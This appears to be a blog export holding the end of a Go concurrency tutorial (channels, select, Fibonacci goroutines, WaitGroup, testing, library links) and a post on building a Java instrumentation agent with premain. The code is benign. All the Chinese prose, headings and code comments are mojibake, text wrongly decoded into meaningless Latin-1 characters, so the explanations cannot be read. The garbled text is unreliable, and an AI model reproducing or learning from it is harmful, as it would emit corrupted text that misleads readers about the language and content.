<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="comment">//æ— ç¼“å­˜çš„channelä¸å­˜åœ¨å‘é€å’Œæ¥æ”¶æ•°æ®</span></span><br><span class="line"><span class="comment">// chan&lt;- stringæ˜¯åªå‘é€çš„channel</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="keyword">string</span>, message <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Sending: %#v\n&quot;</span>, message)</span><br><span class="line">    ch &lt;- message</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;-chanæ˜¯åªæ¥æ”¶çš„channel</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Receiving: %#v\n&quot;</span>, &lt;-ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">    send(ch, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">    read(ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¤šè·¯å¤ç”¨"><a href="#å¤šè·¯å¤ç”¨" class="headerlink" title="å¤šè·¯å¤ç”¨"></a>å¤šè·¯å¤ç”¨</h4><p>æœ€åï¼Œè®©æˆ‘ä»¬è®¨è®ºä¸€ä¸ªå…³äºå¦‚ä½•åœ¨ä½¿ç”¨ <code>select</code> å…³é”®å­—çš„åŒæ—¶ä¸å¤šä¸ª channel äº¤äº’çš„ç®€çŸ­ä¸»é¢˜ã€‚ æœ‰æ—¶ï¼Œåœ¨ä½¿ç”¨å¤šä¸ª channel æ—¶ï¼Œéœ€è¦ç­‰å¾…äº‹ä»¶å‘ç”Ÿã€‚ ä¾‹å¦‚ï¼Œå½“ç¨‹åºæ­£åœ¨å¤„ç†çš„æ•°æ®ä¸­å‡ºç°å¼‚å¸¸æ—¶ï¼Œå¯ä»¥åŒ…å«ä¸€äº›é€»è¾‘æ¥å–æ¶ˆæ“ä½œã€‚</p>
<p><code>select</code> è¯­å¥çš„å·¥ä½œæ–¹å¼ç±»ä¼¼äº <code>switch</code> è¯­å¥ï¼Œä½†å®ƒé€‚ç”¨äº channelã€‚ å®ƒä¼šé˜»æ­¢ç¨‹åºçš„æ‰§è¡Œï¼Œç›´åˆ°å®ƒæ”¶åˆ°è¦å¤„ç†çš„äº‹ä»¶ã€‚ å¦‚æœå®ƒæ”¶åˆ°å¤šä¸ªäº‹ä»¶ï¼Œåˆ™ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªã€‚</p>
<p><code>select</code> è¯­å¥çš„ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯ï¼Œå®ƒåœ¨å¤„ç†äº‹ä»¶åå®Œæˆæ‰§è¡Œã€‚ å¦‚æœè¦ç­‰å¾…æ›´å¤šäº‹ä»¶å‘ç”Ÿï¼Œåˆ™å¯èƒ½éœ€è¦ä½¿ç”¨å¾ªç¯ã€‚</p>
<p>è®©æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹ç¨‹åºæ¥çœ‹çœ‹ <code>select</code> çš„è¿è¡Œæƒ…å†µï¼š</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">    ch &lt;- <span class="string">&quot;Done processing!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">replicate</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    ch &lt;- <span class="string">&quot;Done replicating!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    <span class="keyword">go</span> process(ch1)</span><br><span class="line">    <span class="keyword">go</span> replicate(ch2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> process := &lt;-ch1:</span><br><span class="line">            fmt.Println(process)</span><br><span class="line">        <span class="keyword">case</span> replicate := &lt;-ch2:</span><br><span class="line">            fmt.Println(replicate)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç¨‹åºæ—¶ï¼Œå°†çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p>
<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Done replicating!</span><br><span class="line">Done processing!</span><br></pre></td></tr></table></figure>

<p>è¯·æ³¨æ„ï¼Œ<code>replicate</code> å‡½æ•°å…ˆå®Œæˆã€‚ è¿™å°±æ˜¯ä½ åœ¨ç»ˆç«¯ä¸­å…ˆçœ‹åˆ°å…¶è¾“å‡ºçš„åŸå› ã€‚ main å‡½æ•°å­˜åœ¨ä¸€ä¸ªå¾ªç¯ï¼Œå› ä¸º <code>select</code> è¯­å¥åœ¨æ”¶åˆ°äº‹ä»¶åç«‹å³ç»“æŸï¼Œä½†æˆ‘ä»¬ä»åœ¨ç­‰å¾… <code>process</code> å‡½æ•°å®Œæˆã€‚</p>
<p>é€šè¿‡å¹¶å‘å®ç°fibæ•°åˆ—ï¼ˆä¸€ä¸ªæœ‰ç¼“å­˜channelï¼‰</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(number <span class="keyword">float64</span>, ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1.0</span>, <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="keyword">int</span>(number); i++ &#123;</span><br><span class="line">        <span class="comment">// xå˜æˆx+yï¼Œå¾ªç¯ä¿è¯äº†åªéœ€è¦æœ€åä¸€ä¸ª</span></span><br><span class="line">        x, y = y, x+y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r := rand.Intn(<span class="number">3</span>)</span><br><span class="line">    time.Sleep(time.Duration(r) * time.Second)</span><br><span class="line"></span><br><span class="line">    ch &lt;- fmt.Sprintf(<span class="string">&quot;Fib(%v): %v\n&quot;</span>, number, x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">    size := <span class="number">15</span></span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> fib(<span class="keyword">float64</span>(i), ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">        <span class="comment">//åªèƒ½æŒ‰ç…§éšæœºçš„é¡ºåºæ‰“å°ï¼Œå› ä¸ºä¸çŸ¥é“æ˜¯å“ªä¸ªè¿›ç¨‹å…ˆå®Œæˆçš„</span></span><br><span class="line">        fmt.Printf(&lt;-ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    elapsed := time.Since(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>è¾“å…¥quité€€å‡ºè¿ç®—ï¼Œä¸ç„¶è¿›è¡Œfibçš„è®¡ç®—(ä¸¤ä¸ªæ— ç¼“å­˜channel)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> quit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(c <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> c &lt;- x:</span><br><span class="line">                x, y = y, x+y</span><br><span class="line">            <span class="keyword">case</span> &lt;-quit:</span><br><span class="line">                fmt.Println(<span class="string">&quot;Done calculating Fibonacci!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">    command := <span class="string">&quot;&quot;</span></span><br><span class="line">    data := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> fib(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        num := &lt;-data</span><br><span class="line">        fmt.Println(num)</span><br><span class="line">        fmt.Scanf(<span class="string">&quot;%s&quot;</span>, &amp;command)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">&quot;quit&quot;</span> &#123;</span><br><span class="line">            quit &lt;- <span class="literal">true</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line"></span><br><span class="line">    elapsed := time.Since(start)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="sync-waitGroupå¹¶å‘"><a href="#sync-waitGroupå¹¶å‘" class="headerlink" title="sync.waitGroupå¹¶å‘"></a>sync.waitGroupå¹¶å‘</h4><p>å®é™…ä½¿ç”¨ä¸­ç”¨çš„æœ€å¤šçš„è¿˜æ˜¯è¿™ä¸ªå¹¶å‘æ–¹å¼ï¼Œç”¨èµ·æ¥å¾ˆæ–¹ä¾¿</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="comment">//å®šä¹‰å‡ ä¸ªå¹¶å‘çš„åç¨‹</span></span><br><span class="line">	worker := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">10</span>)</span><br><span class="line">	count, _ := GetTop10kCount()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">int64</span></span><br><span class="line"><span class="comment">//åˆ—é˜Ÿä¸­çš„å¹¶å‘ä»»åŠ¡</span></span><br><span class="line">	<span class="keyword">for</span> i = <span class="number">1</span>; i &lt; count; i++ &#123;</span><br><span class="line"></span><br><span class="line">		worker &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		imaven := model.Imaven&#123;Id: i&#125;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°æ¥æ‰§è¡Œå¹¶å‘</span></span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(m model.Imaven)</span></span> &#123;</span><br><span class="line">			<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">                <span class="comment">//æ‰§è¡Œåç¨‹</span></span><br><span class="line">				&lt;-worker</span><br><span class="line">				wg.Done()</span><br><span class="line">			&#125;()</span><br><span class="line">			<span class="comment">//å•ä¸ªåç¨‹å¹¶å¹¶å‘çš„ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">			_, err := global.Top10kEngine.Table(<span class="string">&quot;i_maven&quot;</span>).Get(&amp;imaven)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="built_in">panic</span>(err)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//detect gav is exist,if exist do nothing,else write db</span></span><br><span class="line">			<span class="keyword">if</span> has, _ := global.Engine.Exist(&amp;model.Jarhash&#123;</span><br><span class="line">				GroupId:    imaven.GroupId,</span><br><span class="line">				ArtifactId: imaven.ArtifactId,</span><br><span class="line">				Version:    imaven.Version,</span><br><span class="line">			&#125;); has &#123;</span><br><span class="line">				fmt.Println(imaven.GroupId, imaven.ArtifactId, imaven.Version, <span class="string">&quot; is exists&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				WriteJarHash2DB(global.Client.R(), imaven.GroupId, imaven.ArtifactId, imaven.Version)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;(imaven)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//å¦‚æœè¾¾åˆ°åä¸ªå°±ç­‰å¾…</span></span><br><span class="line">	wg.Wait()</span><br></pre></td></tr></table></figure>





<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>æµ‹è¯•æ–‡ä»¶ä»¥<code>name_test.go</code>å‘½å</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAccount</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>go test -v</code></p>
<p>æ£€æµ‹æ˜¯å¦é€šè¿‡æµ‹è¯•</p>
<h2 id="ç¬¬ä¸‰æ–¹æ¨¡å—æ¨è"><a href="#ç¬¬ä¸‰æ–¹æ¨¡å—æ¨è" class="headerlink" title="ç¬¬ä¸‰æ–¹æ¨¡å—æ¨è"></a>ç¬¬ä¸‰æ–¹æ¨¡å—æ¨è</h2><h3 id="ginæ¡†æ¶"><a href="#ginæ¡†æ¶" class="headerlink" title="ginæ¡†æ¶"></a>ginæ¡†æ¶</h3><p><a href="https://geektutu.com/post/quick-go-gin.html">https://geektutu.com/post/quick-go-gin.html</a></p>
<p><a href="https://laravelacademy.org/post/21861">https://laravelacademy.org/post/21861</a></p>
<h3 id="xorm"><a href="#xorm" class="headerlink" title="xorm"></a>xorm</h3><p>æ–‡æ¡£:</p>
<p><a href="https://gitea.com/xorm/xorm/src/branch/master/README_CN.md">https://gitea.com/xorm/xorm/src/branch/master/README_CN.md</a></p>
<h3 id="gotoml"><a href="#gotoml" class="headerlink" title="gotoml"></a>gotoml</h3><p>ç”¨æ¥è¯»é…ç½®æ–‡ä»¶çš„ç¬¬ä¸‰æ–¹åŒ…</p>
<p>ç¬¬ä¸‰æ–¹åŒ…â€github.com/pelletier/go-tomlâ€</p>
<p>go get ä¸€ä¸‹ç„¶åimport</p>
<p>å‡è®¾æœ‰é…ç½®æ–‡ä»¶<code>config.toml</code></p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[db]</span></span><br><span class="line"><span class="attr">host</span> = <span class="string">&quot;localhost&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read the config.toml and set the value</span></span><br><span class="line">path, err := filepath.Abs(<span class="string">&quot;config.toml&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">config, err := toml.LoadFile(path)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> none <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">db_host := config.Get(<span class="string">&quot;db.host&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> v, ok := db_host.(<span class="keyword">string</span>); ok &#123;</span><br><span class="line">   dbHOST = v</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   none = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if the config is not complete, panic the err</span></span><br><span class="line"><span class="keyword">if</span> none &#123;</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;the config is not complete&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="resty"><a href="#resty" class="headerlink" title="resty"></a>resty</h3><p>ç”¨äºå‘é€å’Œå¤„ç†httpè¯·æ±‚çš„</p>
<p><a href="https://github.com/go-resty/resty">https://github.com/go-resty/resty</a></p>
<h3 id="gjson"><a href="#gjson" class="headerlink" title="gjson"></a>gjson</h3><p>ç”¨äºå¤„ç†jsonæ•°æ®çš„</p>
<p><a href="https://github.com/tidwall/gjson">https://github.com/tidwall/gjson</a></p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
        <tag>åŸºç¡€è¯­æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>javaæ’æ¡©(javaagent)</title>
    <url>/2021/11/25/java%E6%8F%92%E6%A1%A9-javaagent/</url>
    <content><![CDATA[<p>æ˜¨å¤©æ•´äº†åŠå¤©æ²¡æœ‰æ•´å‡ºæ¥çš„é‚£ä¸ªç»“æœæœ€åæ˜¯ä¸€ä¸ªåŒ…åå¼•ç”¨é”™äº†..</p>
<p>åœ¨MANIFEST.MFä¸­ä½¿ç”¨çš„åŒ…åå’Œæˆ‘è‡ªå·±çš„åŒ…åæ²¡æœ‰å¯¹ä¸Šâ€¦</p>
<p>é¦–å…ˆæ¬è¿<a href="http://rui0.cn/archives/1063">è¿™ä¸ªå¸ˆå‚…</a>å…³äºjava Instrumentçš„åŸç†</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637811098130-2021-11-2511:31:38.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637811051074-2021-11-2511:30:51.png"></p>
<h2 id="javaagent"><a href="#javaagent" class="headerlink" title="javaagent"></a>javaagent</h2><p>åœ¨mavené¡¹ç›®é‡Œé¢ä¿®æ”¹pom.xmlæ–‡ä»¶ç„¶åæ·»åŠ å…¥buildçš„é€‰é¡¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Project-name</span>&gt;</span>javaagent<span class="tag">&lt;/<span class="name">Project-name</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Project-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">Project-version</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>com.javaagent.MyAgent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">skip</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skip</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åŠ å…¥packingå’Œbuildæ ‡ç­¾ï¼Œ</p>
<p>é¦–å…ˆåšä¸€ä¸ªMyAgentç±»ï¼Œå¯¼å…¥äº†<code>java.lang.instrument.Instrumentation</code>çš„æ¥å£</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637809667716-2021-11-2511:07:47.png"></p>
<p>è¿™æ˜¯ä¸€ä¸ªJava1.6åŠ è¿›æ¥çš„æ¥å£ï¼Œä½œç”¨å°±æ˜¯ä½ é€šè¿‡jvmtiä»£ç†å¼•ç”¨ç¨‹åºæ¥jvmçš„è®¿é—®ï¼ˆä¸»è¦ç”¨äºç±»çš„åŠ¨æ€æ”¹å˜å’Œæ“ä½œï¼‰ï¼Œè¿™é‡Œåªæ˜¯å°†å…¶ç”¨äºä¸€ä¸ªåœ¨mainå‡½æ•°æ‰§è¡Œä¹‹å‰çš„åŠ«æŒå¹¶åŠ è½½æˆ‘ä»¬è‡ªå·±çš„ç±»ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src/main/java/com/javaagent/MyAgent.java</span></span><br><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello javaagent permain:&quot;</span>+args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™ä¸ªpremainæ–¹æ³•å°±æ˜¯Instrmentationä¸­æä¾›çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥åœ¨mainè¿è¡Œå‰å…ˆè¿è¡Œpremainå‡½æ•°é‡Œé¢çš„å†…å®¹ã€‚</p>
<p>æ¥ä¸‹æ¥å®šä¹‰æ–°ä¸€ä¸ªæ–°çš„ç±»ç”¨æ¥æ‰§è¡Œmainå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src/test/java/MyAgentTest.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgentTest</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘ä¸€ä¸‹MANIFEST.MFæ–‡ä»¶</p>
<p><strong>åœ¨è¿™ä¸ªå‡½æ•°ä¸­éœ€è¦å®šä¹‰å¥½ä¸€ä¸ªPremain-Classé€‰é¡¹ï¼Œè¿™ä¸ªç”¨äºå®šä½åˆšåˆšå†™çš„MyAgenté‚£ä¸ªåŒ…å«äº†Premainå‡½æ•°çš„ç±»ï¼ˆå°±æ˜¯åŒ…ä¸­ç±»çš„ä½ç½®ï¼‰ï¼Œé…ç½®é¡¹å¡«é”™å°±æ²¡æ³•è¿è¡Œã€‚</strong></p>
<p>ç„¶åä½¿ç”¨maven buildè¿™ä¸ªpackage</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637809392632-2021-11-2511:03:12.png"></p>
<p>æœ€åé…ç½®vm optionsæ¥æ·»åŠ ä¸€ä¸ªjavaagentåœ¨å¯åŠ¨æ—¶æ·»åŠ å‚æ•°</p>
<p><code>-javaagent:è¿™é‡Œæ˜¯ä¹‹å‰packageæ‰“åŒ…å‡ºæ¥çš„jaråŒ…è·¯å¾„.jar=1</code></p>
<p>åé¢çš„å‚æ•°1æ˜¯premainå‡½æ•°æ¥æ”¶çš„å‚æ•°argsã€‚</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637810470431-2021-11-2511:21:10.png"></p>
<p>æœ€åè¿è¡Œè¿™ä¸ªMyAgentTest.java</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637810617995-2021-11-2511:23:38.png"></p>
